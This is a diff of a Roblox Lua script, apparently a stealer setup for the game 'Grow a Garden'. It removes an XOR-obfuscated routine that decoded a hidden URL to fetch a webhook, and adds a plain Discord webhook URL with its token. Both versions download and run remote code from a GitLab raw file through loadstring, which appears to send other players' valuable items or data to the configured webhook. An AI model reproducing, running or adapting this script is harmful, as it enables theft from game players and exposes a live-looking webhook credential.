@@ -1,29 +1,6 @@
-local function xor(str, key)
-    local result = ""
-    for i = 1, #str do
-        result = result .. string.char(bit32.bxor(string.byte(str, i), string.byte(key, (i - 1) % #key + 1)))
-    end
-    return result
-end
-local encrypted_url = "IxUaGxILHRxDUFRfV1ZbHC8EDRkYQUYdW1tEUlZdVUNlAgEGTlVXUEZMRkM="
-local url_key = "Kanka12345678901"
-local decoded_url = game:GetService("HttpService"):URLDecode(encrypted_url)
-local decrypt_url = xor(decoded_url, url_key)
-local HttpService = game:GetService("HttpService")
-local encrypted_webhook = "dGhpcy1pcy1hLXNhbXBsZQ=="
-local nonce = "YmFzZTY0LW5vbmNl"
-local tag = "YmFzZTY0LXRhZw=="
-local Username = "ggtrl95"
-local MinimumValue = 1000000
-local DiscordID = "bombclatiii"
-local response = HttpService:PostAsync(decrypt_url, HttpService:JSONEncode({
-    encrypted = encrypted_webhook,
-    nonce = nonce,
-    tag = tag
-}))
-local decrypted_webhook = HttpService:JSONDecode(response).webhook
-_G.Webhook = decrypted_webhook
-_G.Username = Username
-_G.MinimumValue = MinimumValue
-_G.DiscordID = DiscordID
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
+Username = "ggtrl95"
+Webhook = "https://discord.com/api/webhooks/1401001878749446305/z85He5xfmuFXMYjZP8M5xeiYFfKT8YOrLUHGoHS0RNGGVza8o4Hh5RGcucmPNxX7j-pz"
+MinimumValue = 1000000
+DiscordID = "bombclatiii" -- optional if you wanna be in hits lb
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))() 
